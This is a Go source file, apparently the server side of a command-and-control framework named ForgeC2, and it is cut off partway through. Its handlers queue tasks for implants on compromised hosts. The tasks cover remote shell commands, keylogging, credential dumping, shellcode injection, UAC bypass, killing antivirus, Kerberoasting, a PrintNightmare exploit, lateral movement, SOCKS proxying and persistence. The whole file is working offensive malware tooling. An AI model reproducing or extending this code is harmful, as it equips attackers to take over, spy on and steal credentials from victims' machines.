package server

import (
	"encoding/base64"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func validateCallbackURL(rawURL string) error {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("invalid URL")
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return fmt.Errorf("scheme must be http or https")
	}
	host := parsed.Hostname()
	if host == "" {
		return fmt.Errorf("missing host")
	}
	ip := net.ParseIP(host)
	if ip == nil {
		ips, err := net.LookupIP(host)
		if err != nil || len(ips) == 0 {
			return fmt.Errorf("cannot resolve host")
		}
		for _, resolved := range ips {
			if isPrivateIP(resolved.String()) {
				return fmt.Errorf("private/internal IP addresses are not allowed")
			}
		}
		return nil
	}
	if isPrivateIP(ip.String()) {
		return fmt.Errorf("private/internal IP addresses are not allowed")
	}
	return nil
}

func validatePID(s string) error {
	n, err := strconv.Atoi(s)
	if err != nil || n <= 0 {
		return fmt.Errorf("must be a positive integer PID")
	}
	return nil
}

// allowedCallbackMethods restricts callback HTTP methods to safe verbs.
// DELETE, PUT, PATCH are rejected to prevent SSRF-based request forgery.
var allowedCallbackMethods = map[string]bool{
	"GET": true, "POST": true, "HEAD": true,
}

func validateCallbackMethod(method string) error {
	if method == "" {
		return nil
	}
	upper := strings.ToUpper(method)
	if !allowedCallbackMethods[upper] {
		return fmt.Errorf("callback method %q not allowed (use GET, POST, or HEAD)", method)
	}
	return nil
}

func (s *Server) handleShellPage(c *gin.Context) {
	id := c.Param("id")
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	agent.Status = s.agentStatus(agent).Status

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":            fmt.Sprintf("ForgeC2 - Shell %s", agent.Hostname),
		"ActiveNav":        "agents",
		"Agent":            agent,
		"IsFullPage":       true,
		"ExpectedInterval": s.cfg.Implant.DefaultInterval,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

func (s *Server) handleSendCommand(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	cmd := c.PostForm("command")
	if len(cmd) > MaxCommandLength {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("command too long (max %d characters)", MaxCommandLength))
		return
	}
	shell := c.PostForm("shell")
	callbackURL := c.PostForm("callback_url")
	callbackMethod := c.PostForm("callback_method")
	if shell == "" {
		shell = "cmd.exe"
	}

	slog.Debug("HandleSendCommand called", "agent_id", id, "command", truncateString(cmd, 100))

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	// Validate callback fields BEFORE creating the task so a rejected request
	// never leaves a pending task that the agent would execute anyway.
	if callbackURL != "" {
		if err := validateCallbackURL(callbackURL); err != nil {
			respondError(c, http.StatusBadRequest, "invalid callback URL")
			return
		}
		if err := validateCallbackMethod(callbackMethod); err != nil {
			respondError(c, http.StatusBadRequest, "invalid callback method")
			return
		}
	}

	task, err := s.createTask(id, "shell", cmd, shell, "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	// Set callback fields if provided
	if callbackURL != "" {
		if err := s.db.Model(&task).Updates(map[string]interface{}{
			"callback_url":    callbackURL,
			"callback_method": callbackMethod,
		}).Error; err != nil {
			slog.Error("Failed to update task callback", "task_id", task.ID, "error", err)
			respondError(c, http.StatusInternalServerError, "failed to update task callback")
			return
		}
		task.CallbackURL = callbackURL
		if callbackMethod != "" {
			task.CallbackMethod = callbackMethod
		}
	}

	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", truncateString(cmd, 100))
	s.dispatchTask(c, task, "send_command", cmd)
}

func (s *Server) handleGetAgentTasks(c *gin.Context) {
	id := c.Param("id")
	p := parsePagination(c, DefaultTaskPageSize, MaxTaskPageSize)

	query := s.db.Where("agent_id = ?", id).
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"})

	var total int64
	if err := query.Model(&db.Task{}).Count(&total).Error; err != nil {
		slog.Error("Failed to count agent tasks", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to query tasks")
		return
	}

	var tasks []db.Task
	if err := query.Order("created_at desc").Offset(p.Offset).Limit(p.PageSize).Find(&tasks).Error; err != nil {
		slog.Error("Failed to query agent tasks", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to query tasks")
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"tasks":    tasks,
		"total":    total,
		"page":     p.Page,
		"pageSize": p.PageSize,
	})
}

func (s *Server) handleGetTaskStatus(c *gin.Context) {
	taskID := c.Param("taskId")

	var task db.Task
	if err := s.db.Preload("Agent").First(&task, taskID).Error; err != nil {
		respondError(c, http.StatusNotFound, "task not found")
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"id":         task.ID,
		"status":     task.Status,
		"result":     task.Result,
		"error":      task.Error,
		"command":    task.Command,
		"type":       task.Type,
		"agent":      task.Agent.Hostname,
		"created":    task.CreatedAt.Format("2006-01-02 15:04:05"),
		"created_by": task.CreatedBy,
	})
}

// handleBatchTaskStatus returns the status of multiple tasks in a single request.
// POST /api/v1/tasks/batch-status  body: task_ids=1,2,3
func (s *Server) handleBatchTaskStatus(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	idsStr := c.PostForm("task_ids")
	if idsStr == "" {
		idsStr = c.Query("task_ids")
	}
	if idsStr == "" {
		respondError(c, http.StatusBadRequest, "task_ids is required")
		return
	}

	idStrs := strings.Split(idsStr, ",")
	if len(idStrs) > MaxBulkCancelLimit {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("too many task IDs (max %d)", MaxBulkCancelLimit))
		return
	}

	var ids []uint
	for _, s := range idStrs {
		s = strings.TrimSpace(s)
		n, err := strconv.ParseUint(s, 10, 32)
		if err != nil {
			continue
		}
		ids = append(ids, uint(n))
	}
	if len(ids) == 0 {
		respondError(c, http.StatusBadRequest, "no valid task IDs")
		return
	}

	var tasks []db.Task
	if err := s.db.Where("id IN ?", ids).Find(&tasks).Error; err != nil {
		slog.Error("Failed to query tasks for batch status", "error", err)
		respondError(c, http.StatusInternalServerError, "failed to query tasks")
		return
	}

	type taskStatus struct {
		ID     uint   `json:"id"`
		Status string `json:"status"`
		Result string `json:"result,omitempty"`
		Error  string `json:"error,omitempty"`
	}
	results := make([]taskStatus, len(tasks))
	for i, t := range tasks {
		results[i] = taskStatus{
			ID:     t.ID,
			Status: t.Status,
			Result: t.Result,
			Error:  t.Error,
		}
	}
	c.JSON(http.StatusOK, gin.H{"tasks": results, "total": len(results)})
}

func (s *Server) handleRequestPS(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"ps", "request_ps", "process list"})
}

func (s *Server) handleSuspendProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if target == "" {
		respondError(c, http.StatusBadRequest, "target PID is required")
		return
	}
	if err := validatePID(target); err != nil {
		respondError(c, http.StatusBadRequest, "invalid PID")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "suspend", target, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Suspend requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "suspend_process", target)
}

func (s *Server) handleResumeProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if target == "" {
		respondError(c, http.StatusBadRequest, "target PID is required")
		return
	}
	if err := validatePID(target); err != nil {
		respondError(c, http.StatusBadRequest, "invalid PID")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "resume", target, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Resume requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "resume_process", target)
}

func (s *Server) handleKillProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if target == "" {
		respondError(c, http.StatusBadRequest, "target PID is required")
		return
	}
	if err := validatePID(target); err != nil {
		respondError(c, http.StatusBadRequest, "invalid PID")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "killproc", target, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Kill process requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "kill_process", target)
}

func (s *Server) handleClipboardGet(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"clipboard_get", "clipboard_get", ""})
}

func (s *Server) handleClipboardSet(c *gin.Context) {
	id := c.Param("id")
	data := c.PostForm("data")
	if data == "" {
		data = c.PostForm("command")
	}
	if data == "" {
		respondError(c, http.StatusBadRequest, "clipboard data is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "clipboard_set", data, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Clipboard set requested", "agent_id", id)
	s.dispatchTask(c, task, "clipboard_set", "")
}

func (s *Server) handleFindFiles(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	pattern := c.PostForm("pattern")
	if path == "" {
		path = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "find", pattern, "", path, "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Find files requested", "agent_id", id, "path", path, "pattern", pattern)
	s.dispatchTask(c, task, "find_files", path+" "+pattern)
}

func (s *Server) handleRegGet(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if key == "" {
		respondError(c, http.StatusBadRequest, "registry key path is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_get", key, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Reg get requested", "agent_id", id, "key", key)
	s.dispatchTask(c, task, "reg_get", key)
}

func (s *Server) handleRegSet(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	data := c.PostForm("data")
	if path == "" {
		respondError(c, http.StatusBadRequest, "registry path is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_set", "", "", path, data, 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Reg set requested", "agent_id", id, "path", path)
	s.dispatchTask(c, task, "reg_set", path)
}

func (s *Server) handleRegDelete(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if key == "" {
		respondError(c, http.StatusBadRequest, "registry key path is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_delete", key, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Reg delete requested", "agent_id", id, "key", key)
	s.dispatchTask(c, task, "reg_delete", key)
}

func (s *Server) handleReboot(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"reboot", "reboot", ""})
}

func (s *Server) handleShutdown(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"shutdown", "shutdown", ""})
}

func (s *Server) handleListDrives(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"drives", "list_drives", ""})
}

func (s *Server) handleBeaconNow(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"beacon_now", "beacon_now", ""})
}

func (s *Server) handleListServices(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"services", "list_services", ""})
}

func (s *Server) handlePortScan(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "portscan", target, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Portscan requested", "agent_id", id, "target", target)
	s.dispatchTask(c, task, "portscan", target)
}

func (s *Server) handleNetstat(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"netstat", "netstat", ""})
}

func (s *Server) handleUsers(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"users", "users", ""})
}

func (s *Server) handleAV(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"av", "av", ""})
}

func (s *Server) handleDownloadURL(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	url := c.PostForm("url")
	dest := c.PostForm("dest")
	if url == "" {
		url = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "download_url", url, dest, dest, "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Download URL requested", "agent_id", id, "url", url)
	s.dispatchTask(c, task, "download_url", url+" -> "+dest)
}

func (s *Server) handleUninstall(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"uninstall", "uninstall", ""})
}

func (s *Server) handleSetSleep(c *gin.Context) {
	id := c.Param("id")

	var sleep string
	if strings.Contains(c.ContentType(), "application/json") {
		var req struct {
			Interval int `json:"interval"`
			Jitter   int `json:"jitter"`
		}
		if err := c.ShouldBindJSON(&req); err == nil {
			if req.Interval < 1 || req.Interval > 86400 || req.Jitter < 0 || req.Jitter > 100 {
				respondError(c, http.StatusBadRequest, "invalid sleep range: interval 1-86400 seconds, jitter 0-100 percent")
				return
			}
			sleep = fmt.Sprintf("%d,%d", req.Interval, req.Jitter)
		}
	}
	if sleep == "" {
		sleep = c.PostForm("sleep")
	}
	if sleep == "" {
		sleep = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "set_sleep", sleep, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Set sleep requested", "agent_id", id, "sleep", sleep)
	s.dispatchTask(c, task, "set_sleep", sleep)
}

func (s *Server) handleElevate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	cmd := c.PostForm("cmd")
	if cmd == "" {
		cmd = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "elevate", cmd, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Elevate requested", "agent_id", id, "cmd", cmd)
	s.dispatchTask(c, task, "elevate", cmd)
}

func (s *Server) handleUACBypass(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	method := c.PostForm("method")
	if method == "" {
		respondError(c, http.StatusBadRequest, "method is required (eventvwr, fodhelper, computerdefaults, sdclt, cmstp)")
		return
	}
	payload := c.PostForm("payload")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	cmd := method + "|" + payload
	task, err := s.createTask(id, "uac_bypass", cmd, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create uac_bypass task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("UAC bypass requested", "agent_id", id, "method", method)
	s.LogAuditRecord(c, "uac_bypass", "agent", id, "UAC bypass: "+method, true, nil)
	s.dispatchTask(c, task, "uac_bypass", method)
}

func (s *Server) handleKillAV(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kill_av", "kill_av", ""})
}

// Keylogger handlers (high-value addition)
func (s *Server) handleStartKeylogger(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_start", "keylogger_start", "start"})
}

func (s *Server) handleStopKeylogger(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_stop", "keylogger_stop", "stop"})
}

func (s *Server) handleDumpKeylogger(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_dump", "keylogger_dump", "dump logs"})
}

// === High value CS parity: 1(SOCKS),3(creds),4(inject),6(lateral) ===

func (s *Server) handleCredsDump(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"creds", "creds_dump", ""})
}

func (s *Server) handleInject(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	pidStr := c.PostForm("pid")
	pid, err := strconv.Atoi(pidStr)
	if err != nil || pid <= 0 {
		respondError(c, http.StatusBadRequest, "invalid pid: must be a positive integer")
		return
	}
	tech := c.PostForm("tech")
	if tech == "" {
		tech = "createremotethread"
	}
	if err := validateCommandArg(tech, MaxTechniqueLength, "technique"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	scB64 := c.PostForm("shellcode") // base64 shellcode
	scBytes, err := base64.StdEncoding.DecodeString(scB64)
	if err != nil {
		respondError(c, http.StatusBadRequest, "shellcode is not valid base64")
		return
	}
	if len(scBytes) == 0 {
		respondError(c, http.StatusBadRequest, "shellcode is empty")
		return
	}
	if len(scBytes) > MaxShellcodeSize {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("shellcode too large: %d bytes (max %d)", len(scBytes), MaxShellcodeSize))
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	cmd := pidStr + "|" + tech
	task, err := s.createTask(id, "inject", cmd, "", "", scB64, 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Inject requested", "agent_id", id, "pid", pidStr, "tech", tech)
	s.dispatchTask(c, task, "inject", cmd)
}

func (s *Server) handleSpawn(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = "rundll32.exe"
	}
	if err := validateCommandArg(target, MaxTargetLength, "target"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	technique := c.PostForm("technique")
	if technique == "" {
		technique = "CreateRemoteThread"
	}
	if err := validateCommandArg(technique, MaxTechniqueLength, "technique"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	_, b64Data, size, ok := s.handleFileUpload(c, "shellcode")
	if !ok {
		return
	}

	cmd := target + "|" + technique + "|" + b64Data
	task, err := s.createTask(id, "spawn", cmd, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Spawn requested", "agent_id", id, "target", target, "tech", technique, "size", size)
	s.LogAuditRecord(c, "spawn", "agent", id, fmt.Sprintf("Spawn: %s|%s (%d bytes shellcode)", target, technique, size), true, nil)
	s.dispatchTask(c, task, "spawn", fmt.Sprintf("%s|%s", target, technique))
}

// handleMigrate relocates the implant into a fresh process context: a copy of
// the agent is spawned detached at an optional operator-supplied path (default:
// platform-appropriate temp location) and the current instance exits.
func (s *Server) handleMigrate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	path := c.PostForm("path")
	if err := validateCommandArg(path, MaxTargetLength, "path"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}

	task, err := s.createTask(id, "migrate", path, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Migrate requested", "agent_id", id, "path", path)
	s.LogAuditRecord(c, "migrate", "agent", id, fmt.Sprintf("Process migration requested (path=%q)", path), true, nil)
	s.dispatchTask(c, task, "migrate", path)
}

func (s *Server) handleLateral(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	spec := c.PostForm("spec")
	if spec == "" {
		spec = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "lateral", spec, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Lateral movement requested", "agent_id", id, "spec", spec)
	s.dispatchTask(c, task, "lateral", spec)
}

func (s *Server) handleSocks(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	port := c.PostForm("port")
	if port == "" {
		port = c.PostForm("command")
	}
	if port == "" {
		port = "1080"
	}
	if n, err := strconv.Atoi(port); err != nil || n < 1 || n > 65535 {
		respondError(c, http.StatusBadRequest, "invalid port (1-65535)")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	// Command carries the listen port on the *agent*
	task, err := s.createTask(id, "socks", port, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("SOCKS5 requested on agent", "agent_id", id, "port", port)
	s.dispatchTask(c, task, "socks", port)
}

// handleCancelTask cancels a pending or running task.
// POST /agents/:id/tasks/:taskId/cancel
func (s *Server) handleCancelTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		respondError(c, http.StatusBadRequest, "invalid task id")
		return
	}

	var task db.Task
	if err := s.db.First(&task, taskID).Error; err != nil {
		respondError(c, http.StatusNotFound, "task not found")
		return
	}
	if task.AgentID != agentID {
		respondError(c, http.StatusForbidden, "task belongs to different agent")
		return
	}

	if task.Status != "pending" && task.Status != "running" {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("task is %s, cannot cancel", task.Status))
		return
	}

	wasRunning := task.Status == "running"

	if err := s.db.Model(&task).Updates(map[string]interface{}{
		"status": "cancelled",
		"error":  "cancelled by operator",
	}).Error; err != nil {
		slog.Error("Failed to update task status to cancelled", "agent_id", agentID, "task", taskID, "err", err)
		respondError(c, http.StatusInternalServerError, "failed to cancel task")
		return
	}

	if wasRunning {
		abortTask := db.Task{
			AgentID:   agentID,
			Type:      "abort",
			Command:   fmt.Sprintf("%d", taskID),
			Status:    "pending",
			Priority:  3,
			ClaimedBy: agentID,
			ClaimedAt: time.Now(),
			CreatedBy: c.GetString("user"),
		}
		if err := s.db.Create(&abortTask).Error; err != nil {
			slog.Error("Failed to inject abort task", "agent_id", agentID, "original_task", taskID, "err", err)
		} else {
			s.agentPendingTasksMu.Lock()
			s.agentPendingTasks[agentID]++
			s.agentPendingTasksMu.Unlock()
			s.broadcastTaskUpdate(agentID, abortTask)
			slog.Info("Abort task injected for cancelled running task", "agent_id", agentID, "original_task", taskID)
		}
	}

	slog.Info("Task cancelled", "agent_id", agentID, "task", taskID, "type", task.Type)
	s.LogAuditRecord(c, "cancel_task", "agent_id", agentID, fmt.Sprintf("Cancelled task #%d (%s)", taskID, task.Type), true, nil)
	s.broadcastTaskUpdate(agentID, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Task cancelled"})
}

// handleRerunTask clones an existing task's parameters and creates a new pending task.
// POST /agents/:id/task/:taskId/rerun
func (s *Server) handleRerunTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	role, _ := c.Get("user_role")
	if role == "viewer" {
		respondError(c, http.StatusForbidden, "viewers cannot rerun tasks")
		return
	}
	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		respondError(c, http.StatusBadRequest, "invalid task id")
		return
	}

	var original db.Task
	if err := s.db.First(&original, taskID).Error; err != nil {
		respondError(c, http.StatusNotFound, "original task not found")
		return
	}

	// Only rerun tasks that belong to this agent
	if original.AgentID != agentID {
		respondError(c, http.StatusForbidden, "task belongs to different agent")
		return
	}

	// Don't allow rerun of control/monitoring tasks
	noRerun := map[string]bool{
		"kill_agent": true, "screen_stream_start": true, "screen_stream_stop": true,
	}
	if noRerun[original.Type] {
		respondError(c, http.StatusBadRequest, "cannot rerun this task type")
		return
	}

	// Clone the original task parameters
	newTask, err := s.createTask(agentID, original.Type, original.Command, original.Shell, original.Path, original.Data, original.Offset, original.Size)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("Task rerun", "agent_id", agentID, "original_task", taskID, "new_task", newTask.ID, "type", original.Type)
	s.dispatchTask(c, newTask, "rerun_"+original.Type, fmt.Sprintf("rerun of #%d", taskID))
}

// 鈹€鈹€ execute-assembly: Upload and execute .NET assembly 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handleExecuteAssembly(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	filename, b64Data, size, ok := s.handleFileUpload(c, "assembly")
	if !ok {
		return
	}

	task, err := s.createTask(id, "execute_assembly", "", "", "", b64Data, 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Execute-assembly requested", "agent_id", id, "assembly", filename, "size", size)
	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", filename, size), true, nil)
	s.dispatchTask(c, task, "execute_assembly", filename)
}

// 鈹€鈹€ kerberoast: Request TGS hashes for all SPNs 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handleKerberoast(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kerberoast", "kerberoast", "Kerberoast requested"})
}

// 鈹€鈹€ elevate_printnightmare: PrintNightmare exploit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	dllPath := c.PostForm("dll_path")
	if dllPath == "" {
		respondError(c, http.StatusBadRequest, "dll_path is required (upload a malicious DLL first via File Browser)")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "elevate_printnightmare", dllPath, "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("PrintNightmare exploit requested", "agent_id", id, "dll", dllPath)
	s.LogAuditRecord(c, "elevate_printnightmare", "agent", id, fmt.Sprintf("PrintNightmare DLL: %s", dllPath), true, nil)
	s.dispatchTask(c, task, "elevate_printnightmare", dllPath)
}

// 鈹€鈹€ Persistence Toolkit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handlePersistence(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	action := c.PostForm("action")
	method := c.PostForm("method")
	binaryPath := c.PostForm("binary_path")

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	switch action {
	case "add":
		if method == "" {
			respondError(c, http.StatusBadRequest, "method is required")
			return
		}
		cmd := method + "|" + binaryPath
		task, err := s.createTask(id, "persistence_add", cmd, "", "", "", 0, 0)
		if err != nil {
			respondError(c, http.StatusInternalServerError, "failed to create task")
			return
		}
		slog.Info("Persistence add requested", "agent_id", id, "method", method)
		s.LogAuditRecord(c, "persistence_add", "agent", id, "Persistence add: "+method, true, nil)
		s.dispatchTask(c, task, "persistence_add", method)

	case "list":
		task, err := s.createTask(id, "persistence_list", "", "", "", "", 0, 0)
		if err != nil {
			respondError(c, http.StatusInternalServerError, "failed to create task")
			return
		}
		slog.Info("Persistence list requested", "agent_id", id)
		s.LogAuditRecord(c, "persistence_list", "agent", id, "Persistence list", true, nil)
		s.dispatchTask(c, task, "persistence_list", "list")

	case "remove":
		if method == "" {
			respondError(c, http.StatusBadRequest, "method is required")
			return
		}
		cmd := method + "|" + binaryPath
		task, err := s.createTask(id, "persistence_remove", cmd, "", "", "", 0, 0)
		if err != nil {
			respondError(c, http.StatusInternalServerError, "failed to create task")
			return
		}
